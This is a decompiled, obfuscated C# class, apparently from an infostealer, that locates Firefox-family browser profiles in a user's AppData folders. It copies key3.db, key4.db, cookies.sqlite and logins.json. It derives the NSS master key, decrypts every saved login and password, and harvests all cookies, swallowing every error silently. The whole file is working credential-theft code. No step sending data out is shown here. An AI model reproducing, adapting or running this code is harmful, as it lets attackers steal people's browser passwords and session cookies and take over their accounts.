using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using NoiseMe.Drags.App.Data.Gecko;
using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Data.SQLite;
using NoiseMe.Drags.App.DTO.Linq;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using NoiseMe.Drags.App.Models.Delegates;
using NoiseMe.Drags.App.Models.JSON;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;

namespace NoiseMe.Drags.App.Data.Recovery
{
	// Token: 0x02000192 RID: 402
	public class hhhh6r : GH9kf<BrowserProfile>
	{
		// Token: 0x06000CC3 RID: 3267 RVA: 0x000281C4 File Offset: 0x000263C4
		public List<BrowserProfile> EnumerateData()
		{
			List<BrowserProfile> list = new List<BrowserProfile>();
			try
			{
				List<string> list2 = new List<string>();
				list2.AddRange(rcvr.FindPaths(strg.LocalAppData, 4, 1, new string[]
				{
					"key3.db",
					"key4.db",
					"cookies.sqlite",
					"logins.json"
				}));
				list2.AddRange(rcvr.FindPaths(strg.RoamingAppData, 4, 1, new string[]
				{
					"key3.db",
					"key4.db",
					"cookies.sqlite",
					"logins.json"
				}));
				foreach (string text in list2)
				{
					string fullName = new FileInfo(text).Directory.FullName;
					string text2 = text.Contains(strg.RoamingAppData) ? hhhh6r.prbn(fullName) : hhhh6r.plbn(fullName);
					if (!string.IsNullOrEmpty(text2))
					{
						BrowserProfile browserProfile = new BrowserProfile
						{
							Name = text2,
							Profile = new DirectoryInfo(fullName).Name,
							BrowserCookies = new List<BrowserCookie>(this.CookMhn(fullName)).IsNull<List<BrowserCookie>>(),
							BrowserCredendtials = new List<BrowserCredendtial>(this.Creds(fullName).IsNull<List<BrowserCredendtial>>()).IsNull<List<BrowserCredendtial>>()
						};
						if (browserProfile.BrowserCookies.Count((BrowserCookie x) => x.IsNotNull<BrowserCookie>()) <= 0)
						{
							if (browserProfile.BrowserCredendtials.Count((BrowserCredendtial x) => x.IsNotNull<BrowserCredendtial>()) <= 0)
							{
								continue;
							}
						}
						list.Add(browserProfile);
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x06000CC4 RID: 3268 RVA: 0x000283A8 File Offset: 0x000265A8
		public List<BrowserCredendtial> Creds(string profile)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				if (File.Exists(Path.Combine(profile, "key3.db")))
				{
					list.AddRange(this.Lopos(profile, hhhh6r.p3k(rcvr.CreateTempCopy(Path.Combine(profile, "key3.db")))));
				}
				if (File.Exists(Path.Combine(profile, "key4.db")))
				{
					list.AddRange(this.Lopos(profile, hhhh6r.p4k(rcvr.CreateTempCopy(Path.Combine(profile, "key4.db")))));
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x06000CC5 RID: 3269 RVA: 0x0002843C File Offset: 0x0002663C
		public List<BrowserCookie> CookMhn(string profile)
		{
			List<BrowserCookie> list = new List<BrowserCookie>();
			try
			{
				string text = Path.Combine(profile, "cookies.sqlite");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cnt = new CNT(rcvr.CreateTempCopy(text));
				cnt.ReadTable("moz_cookies");
				for (int i = 0; i < cnt.RowLength; i++)
				{
					BrowserCookie browserCookie = null;
					try
					{
						browserCookie = new BrowserCookie
						{
							Host = cnt.ParseValue(i, "host").Trim(),
							Http = (cnt.ParseValue(i, "isSecure") == "1"),
							Path = cnt.ParseValue(i, "path").Trim(),
							Secure = (cnt.ParseValue(i, "isSecure") == "1"),
							Expires = cnt.ParseValue(i, "expiry").Trim(),
							Name = cnt.ParseValue(i, "name").Trim(),
							Value = cnt.ParseValue(i, "value")
						};
					}
					catch
					{
					}
					if (browserCookie != null)
					{
						list.Add(browserCookie);
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x06000CC6 RID: 3270 RVA: 0x000285A4 File Offset: 0x000267A4
		public List<BrowserCredendtial> Lopos(string profile, byte[] privateKey)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				string path = rcvr.CreateTempCopy(Path.Combine(profile, "logins.json"));
				if (!File.Exists(path))
				{
					return list;
				}
				foreach (object obj in ((IEnumerable)File.ReadAllText(path).FromJSON()["logins"]))
				{
					JsonValue jsonValue = (JsonValue)obj;
					нкрпар нкрпар = Апн.Create(Convert.FromBase64String(jsonValue["encryptedUsername"].ToString(false)));
					нкрпар нкрпар2 = Апн.Create(Convert.FromBase64String(jsonValue["encryptedPassword"].ToString(false)));
					string text = Regex.Replace(шо67г.lTRjlt(privateKey, нкрпар.Objects[0].Objects[1].Objects[1].ObjectData, нкрпар.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					string text2 = Regex.Replace(шо67г.lTRjlt(privateKey, нкрпар2.Objects[0].Objects[1].Objects[1].ObjectData, нкрпар2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					BrowserCredendtial browserCredendtial = new BrowserCredendtial
					{
						URL = (string.IsNullOrEmpty(jsonValue["hostname"].ToString(false)) ? "UNKNOWN" : jsonValue["hostname"].ToString(false)),
						Login = (string.IsNullOrEmpty(text) ? "UNKNOWN" : text),
						Password = (string.IsNullOrEmpty(text2) ? "UNKNOWN" : text2)
					};
					if (browserCredendtial.Login != "UNKNOWN" && browserCredendtial.Password != "UNKNOWN" && browserCredendtial.URL != "UNKNOWN")
					{
						list.Add(browserCredendtial);
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x06000CC7 RID: 3271 RVA: 0x00028808 File Offset: 0x00026A08
		private static byte[] p4k(string file)
		{
			byte[] result = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return result;
				}
				CNT cnt = new CNT(file);
				cnt.ReadTable("metaData");
				string s = cnt.ParseValue(0, "item1");
				string s2 = cnt.ParseValue(0, "item2)");
				нкрпар нкрпар = Апн.Create(Encoding.Default.GetBytes(s2));
				byte[] objectData = нкрпар.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				byte[] objectData2 = нкрпар.Objects[0].Objects[1].ObjectData;
				р6прлгв р6прлгв = new р6прлгв(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
				р6прлгв.го7па();
				шо67г.lTRjlt(р6прлгв.DataKey, р6прлгв.DataIV, objectData2, PaddingMode.None);
				cnt.ReadTable("nssPrivate");
				int rowLength = cnt.RowLength;
				string s3 = string.Empty;
				for (int i = 0; i < rowLength; i++)
				{
					if (cnt.ParseValue(i, "a102") == Encoding.Default.GetString(strg.Key4MagicNumber))
					{
						s3 = cnt.ParseValue(i, "a11");
						break;
					}
				}
				нкрпар нкрпар2 = Апн.Create(Encoding.Default.GetBytes(s3));
				objectData = нкрпар2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				objectData2 = нкрпар2.Objects[0].Objects[1].ObjectData;
				р6прлгв = new р6прлгв(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
				р6прлгв.го7па();
				result = Encoding.Default.GetBytes(шо67г.lTRjlt(р6прлгв.DataKey, р6прлгв.DataIV, objectData2, PaddingMode.PKCS7));
			}
			catch (Exception)
			{
			}
			return result;
		}

		// Token: 0x06000CC8 RID: 3272 RVA: 0x00028A30 File Offset: 0x00026C30
		private static byte[] p3k(string file)
		{
			byte[] array = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return array;
				}
				new DataTable();
				ррп6 berkeleyDB = new ррп6(file);
				о6а о6а = new о6а(hhhh6r.vbv(berkeleyDB, (string x) => x.Equals("password-check")));
				string hexString = hhhh6r.vbv(berkeleyDB, (string x) => x.Equals("global-salt"));
				р6прлгв р6прлгв = new р6прлгв(rcvr.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), rcvr.ConvertHexStringToByteArray(о6а.EntrySalt));
				р6прлгв.го7па();
				шо67г.lTRjlt(р6прлгв.DataKey, р6прлгв.DataIV, rcvr.ConvertHexStringToByteArray(о6а.Passwordcheck), PaddingMode.None);
				нкрпар нкрпар = Апн.Create(rcvr.ConvertHexStringToByteArray(hhhh6r.vbv(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
				р6прлгв р6прлгв2 = new р6прлгв(rcvr.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), нкрпар.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
				р6прлгв2.го7па();
				нкрпар нкрпар2 = Апн.Create(Апн.Create(Encoding.Default.GetBytes(шо67г.lTRjlt(р6прлгв2.DataKey, р6прлгв2.DataIV, нкрпар.Objects[0].Objects[1].ObjectData, PaddingMode.None))).Objects[0].Objects[2].ObjectData);
				if (нкрпар2.Objects[0].Objects[3].ObjectData.Length > 24)
				{
					Array.Copy(нкрпар2.Objects[0].Objects[3].ObjectData, нкрпар2.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
				}
				else
				{
					array = нкрпар2.Objects[0].Objects[3].ObjectData;
				}
			}
			catch (Exception)
			{
			}
			return array;
		}

		// Token: 0x06000CC9 RID: 3273 RVA: 0x00028C98 File Offset: 0x00026E98
		private static string vbv(ррп6 berkeleyDB, Func<string, bool> predicate)
		{
			string text = string.Empty;
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in berkeleyDB.Keys)
				{
					if (predicate(keyValuePair.Key))
					{
						text = keyValuePair.Value;
					}
				}
			}
			catch (Exception)
			{
			}
			return text.Replace("-", string.Empty);
		}

		// Token: 0x06000CCA RID: 3274 RVA: 0x00028D24 File Offset: 0x00026F24
		private static string prbn(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[2] == "Profiles")
				{
					text = array[1];
				}
				else
				{
					text = array[0];
				}
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x06000CCB RID: 3275 RVA: 0x00028DA0 File Offset: 0x00026FA0
		private static string plbn(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[2] == "Profiles")
				{
					text = array[1];
				}
				else
				{
					text = array[0];
				}
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}
	}
}
